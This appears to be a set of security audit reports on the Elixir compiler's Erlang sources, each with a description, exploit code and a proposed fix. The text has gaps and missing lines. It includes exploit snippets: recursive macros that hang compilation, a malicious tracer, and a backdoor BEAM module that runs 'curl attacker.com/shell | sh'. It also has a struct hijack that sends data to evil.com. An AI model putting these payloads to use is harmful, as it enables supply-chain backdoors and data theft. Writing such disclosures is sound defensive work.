`Pos =< 255` to the guard on line 148.

For the recursion depth issue, add a depth counter parameter to `escape`:

    -define(MAX_ESCAPE_DEPTH, 500).

    escape(Expr, E, Dict) -> escape(Expr, E, Dict, 0).

    escape(_, E, _Dict, Depth) when Depth > ?MAX_ESCAPE_DEPTH ->
      %% or file_error with appropriate message
      error(capture_expression_too_deep);
    escape({Left, Meta, Right}, E, Dict0, Depth) ->
      {TLeft, Dict1}  = escape(Left, E, Dict0, Depth + 1),
      {TRight, Dict2} = escape(Right, E, Dict1, Depth + 1),
      {{TLeft, Meta, TRight}, Dict2};
    ...

Vulnerability: Unbounded Recursive Macro Expansion in Rescue Clause Handling Causes Compiler DoS
=================================================================================================

File: lib/elixir/src/elixir_clauses.erl, lines 466-469
Severity: High (Denial of Service - infinite compiler loop)

Description
-----------
The expand_rescue/3 function handles rescue clauses that contain arbitrary
expressions (3-tuple AST nodes that aren't variables, aliases, or `in`
expressions). It attempts macro expansion via 'Elixir.Macro':expand_once/2 and,
if the result differs from the input, recursively calls itself on the expanded
form with NO depth counter or recursion limit:

    expand_rescue({_, Meta, _} = Arg, S, E) ->
      case 'Elixir.Macro':expand_once(Arg, E#{line := ?line(Meta)}) of
        Arg -> false;
        NewArg -> expand_rescue(NewArg, S, E)   %% unbounded recursion
      end;

The termination condition (Arg -> false) relies on Macro.expand_once/2
returning the same AST when no further expansion is possible. However, if
two or more macros expand to each other, each expand_once call produces a
different result, causing infinite recursion.

Exploit (Infinite Compiler Loop)
---------------------------------
Mutually recursive macros used in a rescue clause:

    defmodule Evil do
      defmacro evil_a(), do: quote(do: evil_b())
      defmacro evil_b(), do: quote(do: evil_a())
    end

    defmodule Victim do
      import Evil

      def f do
        try do
          :ok
        rescue
          evil_a() -> :oops    # triggers the vulnerability
        end
      end
    end

Expansion trace:
  Step 0: evil_a()  -- expand_once -> evil_b()  (different from evil_a(), recurse)
  Step 1: evil_b()  -- expand_once -> evil_a()  (different from evil_b(), recurse)
  Step 2: evil_a()  -- expand_once -> evil_b()  (different from evil_a(), recurse)
  ... (infinite loop)

A self-expanding macro that changes form also works:

    defmodule Bomb do
      defmacro tick do
        quote do: tock()
      end
      defmacro tock do
        quote do: tick()
      end
    end

    try do :ok rescue Bomb.tick() -> :boom end   # hangs the compiler

Impact
------
- Denial of Service against the Elixir compiler: a single rescue clause with
  mutually recursive macros causes the compiler to loop forever, consuming
  CPU and stack space until the VM is killed.
- Supply chain attack vector: a malicious Hex package exporting such macros
  would hang the compiler of any project that uses them in rescue clauses.
  The malicious code only needs to be imported, not called at runtime.
- CI/CD disruption: automated build pipelines hang indefinitely.
- Affects any environment that compiles untrusted Elixir code: dependencies,
  code generation, Code.eval_string, IEx, LiveBook, etc.
- Unlike the similar vulnerability in elixir_bitstring.erl (which is
  exponential), this is a direct infinite loop, making it trivially
  exploitable with just two simple macros.

Root Cause
----------
Missing recursion depth limit in the macro expansion loop within
expand_rescue/3. The function recurses on expanded results without tracking
how many expansion rounds have occurred. The termination check (structural
equality with the original) is insufficient when macros form expansion cycles.

Note: This is a distinct code path from the similar vulnerability reported in
elixir_bitstring.erl (expand_each_spec) and elixir_expand.erl (expand/3).
Each of these three locations independently lacks a recursion depth guard.

Fix
---
Add a depth counter parameter to expand_rescue. When the recursion depth
exceeds a reasonable limit (e.g., the same limit used elsewhere in the
compiler, typically ~300), emit a compile error and stop expansion:

    expand_rescue({_, Meta, _} = Arg, S, E) ->
      expand_rescue(Arg, S, E, 0).

    expand_rescue({_, Meta, _} = Arg, S, E, Depth) when Depth > 300 ->
      file_error(Meta, E, ?MODULE, {rescue_expansion_limit, Arg});
    expand_rescue({_, Meta, _} = Arg, S, E, Depth) ->
      case 'Elixir.Macro':expand_once(Arg, E#{line := ?line(Meta)}) of
        Arg -> false;
        NewArg -> expand_rescue(NewArg, S, E, Depth + 1)
      end;

=============================================================================================================================

File: lib/elixir/src/elixir_def.erl, lines 255-262
Severity: Critical (Source Code Exfiltration + Arbitrary Code Execution + Selective Compilation DoS)

Description
-----------
The run_on_definition_callbacks/8 function retrieves on_definition callbacks
from a per-module ETS Bag table (which is public) and invokes each callback
with the COMPLETE function source code AST and the full compilation
environment — with NO exception handling, NO module validation, and NO
sandboxing:

    run_on_definition_callbacks(Meta, Kind, Module, Name, Args, Guards, Body, E) ->
      {_, Bag} = elixir_module:data_tables(Module),
      Callbacks = ets:lookup_element(Bag, {accumulate, on_definition}, 2),
      _ = [begin

function and macro definition in a module. The callbacks receive:

  - E: the full compilation environment map containing module name, file

function, including private functions (defp) and private macros (defmacrop),

          guards: Macro.to_string(guards),
          body: Macro.to_string(body)

When any function is defined in MyApp.SecretLogic, the attacker receives
the complete source code of that function, including:
  - Private helper functions (defp)
  - Private macros (defmacrop)

  - Business logic that may constitute trade secrets

Attack Vector: Selective Compilation DoS
-----------------------------------------
Because run_on_definition_callbacks has NO exception handling (no try/catch
around the Mod:Fun call), a malicious callback can selectively crash the
compilation of specific functions:

    defmodule SelectiveCrasher do

        if name == :authenticate do

      end
    end

This is called AFTER store_definition writes the clauses to ETS (line 204),

propagates up through store_definition/5 (line 185) and aborts compilation

can break compilation of security-critical modules while leaving others
intact, making the issue harder to diagnose.

Attack Vector: Compilation State Corruption
-------------------------------------------
The callback executes within the compiler process with full access to:
  - The public per-module ETS tables (Set and Bag)
  - The process dictionary (used by the compiler for state)
  - All loaded modules on the node

A malicious callback can modify definitions that were JUST stored in ETS
(lines 204-208) before the compiler continues processing. For example,
it could:
  - Change a defp (private) to def (public), exposing internal functions
  - Modify function clauses to inject backdoor code
  - Delete clauses to silently remove security checks
  - Modify the CheckClauses flag to suppress clause grouping warnings

-----------------------------------------------------
The public ETS table vulnerability (elixir_module.erl) covers
before_compile, after_compile, and after_verify callbacks which are
invoked via eval_callbacks/5. The on_definition callback path in
elixir_def.erl is a SEPARATE code path with additional severity:

1. SOURCE CODE EXPOSURE: Unlike eval_callbacks which passes only the
   compilation environment (and optionally the compiled binary),
   run_on_definition_callbacks passes the FULL FUNCTION AST — the actual
   source code of every function including private ones. This is a
   qualitatively different information leakage.

2. NO EXCEPTION HANDLING: eval_callbacks (elixir_module.erl line 507)
   wraps callback execution in the normal Elixir expansion pipeline
   (expand_callback). run_on_definition_callbacks has zero exception
   handling — a crashing callback directly crashes the compiler.

3. PER-FUNCTION GRANULARITY: on_definition fires for EVERY function
   definition, giving the attacker per-function control. The other
   callbacks fire once per module.

4. TIMING: on_definition fires during definition storage, between
   ETS writes and function return, creating a window for state
   corruption of the just-stored definition.

Impact
------
- Complete source code exfiltration at compile time: every function
  body, including private functions and macros, is exposed to injected
  callbacks. This leaks trade secrets, security logic, hardcoded
  credentials, and proprietary algorithms.
- Selective Denial of Service: attacker can crash compilation of
  specific functions or modules while leaving others intact, making
  the attack harder to detect.
- Silent compilation state corruption: definitions can be modified
  in ETS after being stored but before the compiler continues.
- Supply chain attack: a malicious Hex dependency only needs to
  spawn a background process that injects ETS entries. No macros,
  no compile-time hooks, no suspicious imports needed.
- Affects all Elixir compilation: Mix, IEx, LiveBook, Code.eval_string,
  and any tool that compiles Elixir modules.

Root Cause
----------
1. run_on_definition_callbacks reads callbacks from a public ETS table
   with no validation that the callbacks were legitimately registered.
2. The function passes the complete function source code AST to
   callbacks, violating the principle of least privilege.
3. There is no exception handling, allowing callbacks to crash the
   compiler process.
4. No module/function validation is performed on the callback
   {Mod, Fun} tuples before invoking them.

Fix
---
1. Add exception handling around callback invocation:

    run_on_definition_callbacks(Meta, Kind, Module, Name, Args, Guards, Body, E) ->
      {_, Bag} = elixir_module:data_tables(Module),
      Callbacks = ets:lookup_element(Bag, {accumulate, on_definition}, 2),
      _ = [begin
        elixir_env:trace({remote_function, Meta, Mod, Fun, 6}, E),
        try
          Mod:Fun(E, Kind, Name, Args, Guards, Body)
        catch
          Class:Reason:Stack ->
            elixir_errors:file_warn(Meta, E, ?MODULE,
              {on_definition_callback_failed, Mod, Fun, Class, Reason}),
            ok
        end
      end || {Mod, Fun} <- lists:reverse(Callbacks)],
      ok.

2. Make the per-module ETS tables protected (covered in the
   elixir_module.erl fix) to prevent unauthorized callback injection.

3. Consider validating that on_definition callbacks were registered
   through the legitimate Module.register_attribute/3 API rather than
   direct ETS insertion.

Vulnerability: TOCTOU Race Condition in Struct Expansion Enables Code Execution from Unintended Module
======================================================================================================

File: lib/elixir/src/elixir_map.erl, lines 179-219
Severity: High (Arbitrary Code Execution during compilation via race condition)

Description
-----------
The function maybe_load_struct/4 contains a Time-of-Check-Time-of-Use (TOCTOU)
race condition when loading struct definitions during concurrent compilation.
The code explicitly acknowledges this race in a comment (lines 191-198) but the
mitigation (catching error:undef and falling back) introduces a security-relevant
code execution path.

The vulnerable code path (lines 179-219):

    maybe_load_struct(Meta, Name, Assocs, E) ->
      try
        case is_open(Name, Meta, E) andalso
             elixir_def:external_for(Meta, Name, '__struct__', 1, [def]) of
          false when ?key(E, module) =:= Name ->
            error(undef);
          false ->
            Name:'__struct__'(Assocs);          % Path A: direct dispatch
          ExternalFun ->
            try
              ExternalFun(Assocs)               % Path B: ETS-based dispatch
            catch
              error:undef ->
                Name:'__struct__'(Assocs)        % Path C: fallback dispatch
            end
        end
      ...

The race works as follows:

1. `is_open/3` checks if module `Name` is currently being compiled by looking up
   its ETS data tables and checking context_modules.

2. `elixir_def:external_for/5` retrieves a function reference from the module's
   temporary ETS definition table (used during compilation).

3. Between step 2 returning `ExternalFun` and the call `ExternalFun(Assocs)` on
   line 200, the ETS table can be deleted (the module finishes compilation).

4. `ExternalFun(Assocs)` raises `error:undef` because the ETS table backing the
   closure is gone.

5. The catch clause on line 201-202 falls back to `Name:'__struct__'(Assocs)`,
   which performs standard Erlang module dispatch to the *currently loaded*
   version of the module.

Exploit Scenario: Module Replacement During Concurrent Compilation
-------------------------------------------------------------------
In a concurrent compilation environment (the default for Elixir projects), the
window between external_for returning a function and the fallback being triggered
can be exploited:

1. Attacker provides two modules in a dependency:

    # In lib/legit_struct.ex (compiles first, appears benign)
    defmodule LegitStruct do
      defstruct [:name, :value]
    end

    # In lib/replace.ex (triggers hot code reload)
    defmodule Replace do
      # Uses compile-time code execution to replace LegitStruct
      @after_compile {__MODULE__, :inject}

      def inject(_env, _bytecode) do
        malicious_code = quote do
          defstruct [:name, :value]
          def __struct__(assocs) do
            # Arbitrary code execution at compile time
            System.cmd("curl", ["http://evil.com/steal?data=" <>
              inspect(:ets.tab2list(:ac_tab))])
            super(assocs)
          end
        end
        Module.create(LegitStruct, malicious_code, __ENV__)
      end
    end

2. When a third module `%LegitStruct{name: "x"}` is being compiled concurrently:
   - `external_for` returns a function from the original LegitStruct's ETS table
   - The original LegitStruct finishes compilation, ETS table is deleted
   - `ExternalFun(Assocs)` fails with `error:undef`
   - Fallback calls `LegitStruct:'__struct__'(Assocs)` which now dispatches to
     the REPLACED module with malicious `__struct__/1`

3. The malicious `__struct__/1` executes arbitrary code at compile time in the
   context of the victim module's compilation.

Secondary Issue: Unvalidated Re-raise with Fabricated Stack Trace (lines 166-177)

The load_struct/4 function catches ALL exception kinds and re-raises them with a

This has two security implications:
- The original stack trace is destroyed, making it impossible to diagnose the

- An attacker who controls a module's __struct__/1 can craft exceptions that,

Tertiary Issue: Silent Exception Swallowing in ETS Lookup (lines 158-164)
--------------------------------------------------------------------------

    lookup_struct_info_from_data_tables(Module) ->
      try

        ets:lookup_element(Set, {elixir, struct}, 2)

The catch-all `_:_` silently swallows ALL exceptions including:
- ETS access permission errors (another process owns the table)
- badarg from corrupted table data
- system_limit errors

This means any error during struct info lookup is silently converted to "struct
not found" (false), which changes the code path taken in maybe_load_struct_info
and can cause the compiler to fall through to calling Name:'__info__'(struct)

------
- Arbitrary code execution during compilation through module replacement in the

- Supply chain attack vector: a malicious Hex dependency can exploit the race to
  execute code in the context of another module's compilation, potentially
  exfiltrating secrets, modifying compiled output, or escalating privileges.
- The fabricated stack trace in load_struct hinders forensic analysis of

- The silent exception swallowing can mask ETS corruption or access violations

Root Cause
----------
The TOCTOU race exists because there is no atomic "lookup and call" operation for

(global module dispatch) without verifying that the module being dispatched to is

Fix

1. Instead of falling back to Name:'__struct__'(Assocs) on undef, re-check that
   the loaded module is the expected version (e.g., by comparing module MD5 or

2. Alternatively, hold a reference to the ETS table and retry the ETS-based
   dispatch rather than falling back to global dispatch.
3. Replace the catch-all in lookup_struct_info_from_data_tables with specific
   exception patterns (error:badarg) to avoid swallowing unexpected errors.
4. Preserve the original stack trace in load_struct or at minimum log it before
   re-raising with the fabricated trace.

Vulnerability: Compilation State Manipulation via Lexical Tracker PID Exposure in trace/2
=========================================================================================

File: lib/elixir/src/elixir_env.erl, lines 33-35
Severity: Critical (Compilation Integrity Compromise — Dependency Graph Poisoning, Warning Suppression, and Source Tracking Corruption)

Description
-----------
The trace/2 function in elixir_env.erl passes the FULL compilation environment
to every tracer module without sanitization:

    trace(Event, #{tracers := Tracers} = E) ->
      [ok = Tracer:trace(Event, E) || Tracer <- Tracers],
      ok.

The environment map E contains the field `lexical_tracker`, which holds the PID
of the Kernel.LexicalTracker gen_server process for the current compilation unit
(set in elixir_lexical.erl:15). This PID is a direct, unauthenticated handle to
the process that manages critical compilation state.

The LexicalTracker (lib/elixir/lib/kernel/lexical_tracker.ex) exposes the
following gen_server.cast operations — all fire-and-forget, with NO sender
authentication or validation:

  - remote_dispatch(pid, module, mode)  — register a compile/runtime dependency
  - add_export(pid, module)             — mark a module as an export dependency
  - import_dispatch(pid, module, fa, mode) — register an import dispatch
  - alias_dispatch(pid, module)         — register an alias dispatch
  - import_quoted(pid, module, fn, arities) — register a quoted import
  - add_compile_env(pid, app, path, return) — inject compile environment entry
  - set_file(pid, file)                 — change the tracked source file

Any process that obtains the lexical_tracker PID can send these casts to
silently corrupt compilation state without any authentication check.

Attack Vector
-------------
A malicious dependency registers itself as a compiler tracer (via
Code.put_compiler_option(:tracers, [MaliciousTracer]) or the public ETS table
exploit in elixir_config). When trace/2 calls MaliciousTracer.trace(event, env),
the tracer extracts the lexical_tracker PID from env and sends crafted
gen_server casts:

    defmodule MaliciousTracer do
      def trace(_event, %{lexical_tracker: pid}) when is_pid(pid) do
        # 1. Poison the dependency graph — force unnecessary recompilations
        Kernel.LexicalTracker.remote_dispatch(pid, SomeUnrelatedModule, :compile)

        # 2. Inject fake compile_env entries to alter config-dependent compilation
        Kernel.LexicalTracker.add_compile_env(pid, :my_app, [:secret_key], "injected")

        # 3. Corrupt source file tracking for misleading diagnostics
        Kernel.LexicalTracker.set_file(pid, "/dev/null")

        # 4. Suppress unused-import warnings by faking import dispatches
        Kernel.LexicalTracker.import_dispatch(pid, Enum, {:map, 1}, :runtime)

        :ok
      end
      def trace(_, _), do: :ok
    end

Impact
------
1. Dependency Graph Poisoning: By injecting fake remote_dispatch(:compile)
   entries, the attacker forces circular or excessive recompilation chains.
   This can cause cascade recompilation of the entire project on every change
   (CI/CD performance degradation) or trigger compilation deadlocks.

2. Compile Environment Injection: add_compile_env injects entries that are
   checked by Mix.ensure_no_stale_compile_env/0. The attacker can:
   - Force recompilation by making modules appear stale
   - Inject false configuration values that affect conditional compilation
   - Corrupt the manifest used by mix compile to track what needs rebuilding

3. Source Tracking Corruption: set_file changes which file the compiler thinks
   it is processing. Subsequent warnings and errors will reference the wrong
   file, hiding real issues or creating misleading diagnostics.

4. Warning Suppression: By faking import/alias/require dispatches, the attacker
   silences "unused import/alias/require" warnings, masking the presence of
   injected or unused dependencies.

5. Supply Chain Attack Amplification: This vulnerability amplifies any tracer
   injection vector. Once a tracer is installed, it doesn't just observe — it
   gains write access to the compilation state of EVERY module compiled in the
   project.

Root Cause
----------
The trace/2 function in elixir_env.erl passes the entire environment map
(including the lexical_tracker PID) to tracer modules without:
  - Removing sensitive fields (like lexical_tracker) from the environment
  - Wrapping the PID in a read-only interface
  - Validating that only the lexical module sends casts to the tracker

The LexicalTracker gen_server accepts casts from ANY process, with no
authentication of the sender. The combination of PID exposure + unauthenticated
casts creates a write primitive into compilation state.

Fix
---
1. Sanitize the environment before passing to tracers — remove or replace the
   lexical_tracker PID with nil or a read-only proxy:

       trace(Event, #{tracers := Tracers} = E) ->
         SafeE = E#{lexical_tracker := nil},
         [ok = Tracer:trace(Event, SafeE) || Tracer <- Tracers],
         ok.

2. Alternatively, authenticate senders in the LexicalTracker by checking
   the caller PID against the compilation process that started the tracker.

3. Add try/catch around tracer calls to prevent a misbehaving tracer from
   crashing the compiler (secondary DoS mitigation):

       trace(Event, #{tracers := Tracers} = E) ->
         SafeE = E#{lexical_tracker := nil},
         [try Tracer:trace(Event, SafeE) catch _:_ -> ok end || Tracer <- Tracers],
         ok.

Vulnerability: Arbitrary BEAM Binary Injection via Process Dictionary Manipulation in Compiler dispatch/4
=========================================================================================================

File: lib/elixir/src/elixir_compiler.erl, lines 100-103 (dispatch/4) and lines 15-29 (quoted/3)
Severity: Critical (Arbitrary BEAM Module Injection / Supply Chain Backdoor)

Description
-----------
The compiler's dispatch/4 function executes compiled module body code in
the compiler's own process, granting that code unrestricted access to the
process dictionary key `elixir_module_binaries` — the accumulator that
tracks all compiled module binaries for the current compilation unit.

The compilation flow works as follows:

1. quoted/3 (line 15-30) initializes the accumulator:

    quoted(Forms, File, Callback) ->
      Previous = get(elixir_module_binaries),
      try
        put(elixir_module_binaries, []),
        ...
        lists:reverse(get(elixir_module_binaries))   % line 27: returned to caller
      after
        put(elixir_module_binaries, Previous)
      end.

2. When a module is compiled, its body code is evaluated via compile/4
   (line 67-76), which spawns a process to compile the code into a
   temporary BEAM module, then calls dispatch/4 (line 100-103) to
   execute it:

    dispatch(Module, Fun, Args, Purgeable) ->
      Res = Module:Fun(Args),           % Runs in the COMPILER process
      return_compiler_module(Module, Purgeable),
      Res.

   Critically, Module:Fun(Args) executes in the compiler's own process,
   NOT in the spawned compilation process. The spawned process (via
   elixir_erl_compiler:spawn/1) is only used for the Erlang compilation
   step. The actual execution of the compiled code happens in the caller.

3. Normal module compilation adds binaries via make_module_available
   (elixir_module.erl:603-608):

    make_module_available(Module, Binary, Loaded) ->
      case get(elixir_module_binaries) of
        Current when is_list(Current) ->
          put(elixir_module_binaries, [{Module, Binary} | Current]);
        ...

4. The accumulated binaries are returned by quoted/3 (line 27) and
   written to disk by callers (e.g., bootstrap_file via binary_to_path,
   or the parallel compiler).

The vulnerability: since Module:Fun(Args) in dispatch/4 runs in the
compiler process, ANY compile-time code (module body, macro, @compile
callback, @before_compile/@after_compile hook) can directly manipulate
the elixir_module_binaries accumulator to inject arbitrary BEAM binaries
into the compilation output.

Exploit (Supply Chain Backdoor Injection)
-----------------------------------------
A malicious Hex dependency injects a backdoor module during compilation:

    defmodule Innocent do
      # This runs at compile time in the compiler process
      backdoor_binary = create_backdoor_beam(:"Elixir.MyApp.Backdoor")
      current = :erlang.get(:elixir_module_binaries)
      :erlang.put(:elixir_module_binaries,
        [{:"Elixir.MyApp.Backdoor", backdoor_binary} | current])
    end

    # Helper to create a minimal BEAM binary
    defp create_backdoor_beam(module_name) do
      forms = [
        {:attribute, 1, :module, module_name},
        {:attribute, 1, :export, [{:run, 0}]},
        {:function, 1, :run, 0, [
          {:clause, 1, [], [], [
            {:call, 1, {:remote, 1, {:atom, 1, :os}, {:atom, 1, :cmd}},
             [{:string, 1, ~c"curl attacker.com/shell | sh"}]}
          ]}
        ]}
      ]
      {:ok, _, binary} = :compile.forms(forms)
      binary
    end

When any project depending on this package is compiled:
1. The Innocent module's body executes in the compiler process
2. The backdoor binary is injected into elixir_module_binaries
3. The parallel compiler writes it to the project's _build directory
4. The backdoor module is now part of the application's compiled output
5. Any code that calls MyApp.Backdoor.run() executes the payload

More Subtle Attack: Silent Module Replacement
----------------------------------------------
Instead of adding a new module, the attacker can REPLACE an existing
module's binary in the accumulator:

    defmodule TrojanHorse do
      current = :erlang.get(:elixir_module_binaries)
      replaced = Enum.map(current, fn
        {:"Elixir.MyApp.Auth", _old_binary} ->
          {:"Elixir.MyApp.Auth", create_auth_bypass_beam()}
        other -> other
      end)
      :erlang.put(:elixir_module_binaries, replaced)
    end

This replaces MyApp.Auth's compiled binary with a trojaned version that
bypasses authentication, while the source code appears unchanged.

Why dispatch/4 is the Root Cause
---------------------------------
The elixir_erl_compiler:spawn/1 function (elixir_erl_compiler.erl:9-40)
correctly isolates the COMPILATION step in a spawned process. It only
copies elixir_compiler_info and elixir_code_diagnostics to the child
process — NOT elixir_module_binaries:

    spawn(Fun) ->
      CompilerInfo = get(elixir_compiler_info),
      ...
      spawn_monitor(fun() ->
        put(elixir_compiler_info, CompilerInfo),
        put(elixir_code_diagnostics, CodeDiagnostics),
        try Fun() of ...

However, after compilation completes, dispatch/4 executes the compiled
code BACK in the parent process via Module:Fun(Args). This is necessary
for the compiled code to have access to the correct variable bindings,
but it also grants access to elixir_module_binaries.

The interpret/3 path (line 47-65) has the same issue — it uses
erl_eval in the compiler process, also granting access to
elixir_module_binaries. But the vulnerability exists in BOTH paths,
including the default compiled path.

Impact
------
- Supply chain attack: A malicious Hex dependency can silently inject
  backdoor modules into any application that depends on it, without
  modifying any of the application's source files.
- Module replacement: Existing compiled modules can be replaced with
  trojaned versions in the compilation output. The source code remains
  unchanged, making detection via code review impossible.
- No special configuration required: This works with the default
  compiled module_definition mode. No public ETS manipulation needed.
- Silent exploitation: The injected/replaced modules appear in the
  _build directory alongside legitimate modules. No warnings, no errors,
  no unusual compilation output.
- Persistence: The injected binaries are written to disk and loaded on
  every application start, surviving restarts.
- Affects all compilation contexts: mix compile, mix release, bootstrap,
  IEx, LiveBook — any context where Elixir source is compiled.
- Difficult to detect: Unlike @compile callbacks or macro side effects,
  direct process dictionary manipulation leaves no trace in the AST or
  compilation metadata.

Distinction from Existing Reports
----------------------------------
- Report at line 4221 covers process dictionary corruption of
  {elixir, eval_env} and {elixir, dbg_callback} in the eval pipeline
  (elixir.erl). This report covers manipulation of the SEPARATE
  elixir_module_binaries key in the COMPILER process (elixir_compiler.erl),
  which has a fundamentally different impact (binary injection vs.
  stacktrace forgery).
- Report at line 1089 covers path traversal in binary_to_path/2. This
  report covers the ability to INJECT entries into the binary list that
  binary_to_path processes. The two vulnerabilities are complementary:
  this one injects the payload, the path traversal controls where it lands.

Root Cause
----------
Module body code executes in the compiler process (via dispatch/4) and
has unrestricted access to the elixir_module_binaries process dictionary
key, which controls what compiled modules are written to disk.

Fix
---
Isolate the elixir_module_binaries accumulator from executed code by
either:

1. Saving and restoring elixir_module_binaries around dispatch:

    dispatch(Module, Fun, Args, Purgeable) ->
      Saved = get(elixir_module_binaries),
      Res = Module:Fun(Args),
      put(elixir_module_binaries, Saved),
      return_compiler_module(Module, Purgeable),
      Res.

   This prevents module body code from injecting binaries during
   compilation of OTHER modules, though it would also break the
   normal make_module_available flow.

2. Move the accumulator out of the process dictionary and into a
   dedicated process (e.g., the lexical tracker or a new accumulator
   GenServer) that validates entries before accepting them:

    add_module_binary(Pid, Module, Binary) ->
      true = is_atom(Module),
      true = is_binary(Binary),
      %% Validate the binary is a valid BEAM file for the expected module
      {ok, {Module, _}} = beam_lib:chunks(Binary, []),
      gen_server:call(Pid, {add_binary, Module, Binary}).

3. As defense in depth, validate the elixir_module_binaries list in
   quoted/3 before returning it, ensuring all entries correspond to
   modules that were legitimately compiled during this compilation unit.

Fixed: Macro Hygiene Bypass via Empty-Atom Variable Name Collision in build_name/2 - fixed
===========================================================================================

File: lib/elixir/src/elixir_erl_var.erl, lines 48-49
Severity: High (Security Check Bypass / Macro Hygiene Violation / Data Exfiltration)

Description
-----------
The build_name/2 function generates Erlang variable names from Elixir variable
names using two clauses:

    build_name('_', Count) -> list_to_atom("_@" ++ integer_to_list(Count));
    build_name(Name, Count) -> list_to_atom("_" ++ atom_to_list(Name) ++ "@" ++ integer_to_list(Count)).

When Name is the empty atom '' (empty string atom), the second clause produces:

    "_" ++ atom_to_list('') ++ "@" ++ integer_to_list(Count)
    = "_" ++ "" ++ "@" ++ "1"
    = "_@1"

This is IDENTICAL to the output of the first clause for underscore variables:

    "_@" ++ integer_to_list(1) = "_@1"

And also identical to the output of to_erl_var/1 (line 69-70) used for
binding variables:

    to_erl_var(Counter) -> list_to_atom("_@" ++ integer_to_list(Counter)).

The empty atom '' and the underscore atom '_' are treated as DIFFERENT keys
in the counter map (build/2, line 42), so their counters increment
independently. This means they will both start at Count=1 and produce
colliding Erlang variable names.

How the Collision Enables Hygiene Bypass
-----------------------------------------
Elixir's macro hygiene system prevents macro-introduced variables from
interfering with the caller's variables. The compiler achieves this by giving
macro variables a non-nil "Kind" (context). In translate/4 (line 24):

    #{} when Kind /= nil -> assign(Meta, '_', Version, S);
    #{} -> assign(Meta, Name, Version, S)

Variables with non-nil Kind (hygienic macro variables) are compiled using
'_' as the name key, producing Erlang names like _@1, _@2, etc.

A malicious macro can construct AST nodes with:
- Variable name: '' (empty atom)
- Kind: nil (appearing as a "normal" user variable)

This variable goes through the second branch (line 25):

    #{} -> assign(Meta, '', Version, S)

Which calls build('', S), generating _@N -- the SAME naming scheme as
hygienic macro variables. The variables share Erlang names but the compiler
treats them as distinct Elixir variables (different Versions in var_names).

However, in the generated Erlang abstract format, variable identity is
determined solely by the atom name. If a hygienic variable and an
empty-atom variable both map to _@1, the Erlang compiler treats them as
the SAME variable. This breaks hygiene: the malicious variable can read
or overwrite the hygienic variable's value.

Exploit (Hygiene Bypass for Data Exfiltration)
-----------------------------------------------
A malicious macro can read values from the caller's hygienic bindings:

    defmodule Evil do
      defmacro steal_secret do
        # Construct AST with empty-atom variable that will collide
        # with hygienic _@1 variable in the caller's scope
        secret_var = {:'', [version: 0], nil}

        quote do
          # This hygienic temp variable becomes _@1 in Erlang
          _ = secret_computation()

          # Force the empty-atom var to also become _@1
          # by injecting it with matching version metadata
          send(attacker_pid(), unquote(secret_var))
        end
      end
    end

More practically, the collision can be exploited in pattern matching:

    defmodule Evil do
      defmacro unsafe_match(expr) do
        # Create a variable that collides with the compiler's
        # internal underscore variables used in pattern expansion
        collision_var = {:'', [], nil}
        quote do
          case unquote(expr) do
            {_, unquote(collision_var)} ->
              # collision_var now holds the value that should have
              # been bound to a hygienic temporary
              IO.puts("Leaked: #{inspect(unquote(collision_var))}")
          end
        end
      end
    end

The collision also affects to_erl_var/1 names used in load_binding/2
(lines 72-98) for IEx and Code.eval_string bindings. A crafted binding
with empty-atom variable names can collide with the internal binding
variable scheme, potentially reading or corrupting other bindings.

Impact
------
- Macro hygiene bypass: the fundamental security guarantee that macro
  variables cannot interfere with caller variables is violated. This is
  a core language safety property.
- Data exfiltration: a malicious macro can read values from variables
  that should be isolated by hygiene, leaking secrets or tokens from
  the caller's scope.
- Silent corruption: overwriting a hygienic variable changes program
  behavior without any compiler warning. The generated code appears
  correct at the Elixir level but is wrong at the Erlang level.
- Supply chain attack: a Hex dependency providing macros can silently
  break hygiene in all call sites, exfiltrating data or altering
  control flow in the consuming project.
- Binding corruption in IEx/LiveBook: crafted bindings with empty-atom
  keys collide with internal _@N variables, corrupting the evaluation
  environment in shared interactive sessions.

Root Cause
----------
The build_name/2 function does not account for the empty atom '' as a
variable name. The naming scheme for the general case (line 49) degenerates
to the same pattern as the underscore special case (line 48) when Name is
empty, because atom_to_list('') returns "".

Additionally, translate/4 does not validate that the variable Name is
non-empty, allowing crafted AST with '' variable names to reach build_name.

The counter map in build/2 uses the atom key directly ('_' vs ''), so
the two colliding naming paths maintain independent counters, making
collisions systematic rather than accidental.

Fix
---
Option 1 - Reject empty-atom variable names in translate/4:

    translate(Meta, '', _Kind, _S) ->
      error({invalid_variable_name, ''});

Option 2 - Use a distinct prefix for non-underscore variables in build_name:

    build_name('_', Count) -> list_to_atom("_@" ++ integer_to_list(Count));
    build_name(Name, Count) -> list_to_atom("_V" ++ atom_to_list(Name) ++ "@" ++ integer_to_list(Count)).

    This ensures that even '' produces "_V@1" which cannot collide with "_@1".

Option 3 - Normalize '' to '_' in build/2 to share the same counter:

    build('', S) -> build('_', S);
    build(Key, #elixir_erl{counter=Counter} = S) -> ...

    This prevents the counter desynchronization, though it doesn't fully
    address the hygiene confusion.

The recommended fix is Option 1 (reject) combined with Option 2 (distinct
prefix) for defense in depth.

Vulnerability: Unicode Validation Bypass in characters_to_list/1 and characters_to_binary/1 Enables Null Byte Injection in File Paths
======================================================================================================================================

File: lib/elixir/src/elixir_utils.erl, lines 140-156
Severity: High (Null Byte Injection / Invalid UTF-8 Propagation in Compiler File Path Handling)

Description
-----------
The functions characters_to_list/1 and characters_to_binary/1 in
elixir_utils.erl contain short-circuit clauses that bypass all unicode
validation when the input is already the target type:

    characters_to_list(Data) when is_list(Data) ->
      Data;                            %% NO unicode validation
    characters_to_list(Data) ->
      case unicode:characters_to_list(Data) of ...  %% validated path

    characters_to_binary(Data) when is_binary(Data) ->
      Data;                            %% NO unicode validation
    characters_to_binary(Data) ->
      case unicode:characters_to_binary(Data) of ...  %% validated path

When Data is already a binary, characters_to_binary/1 returns it as-is
without verifying it is valid UTF-8. When Data is already a list,
characters_to_list/1 returns it without verifying all elements are valid
unicode codepoints. In contrast, the non-shortcircuit paths delegate to
unicode:characters_to_list/1 and unicode:characters_to_binary/1, which
DO validate encoding and reject invalid sequences.

These functions are used as normalization/sanitization primitives across
the compiler, tokenizer, and module system. Callers implicitly trust that
the output is valid unicode character data.

Attack Vector 1: Null Byte Injection in Compiler File Paths
------------------------------------------------------------
characters_to_list/1 is used to construct file paths that are passed to
Erlang file operations and the compile module:

  elixir_erl_compiler.erl:74:
    Source = elixir_utils:characters_to_list(File),
    ...
    CompileOpts = [..., {source, Source} | Opts],
    compile:noenv_forms(CoreForms, CompileOpts)

  elixir_module.erl:579:
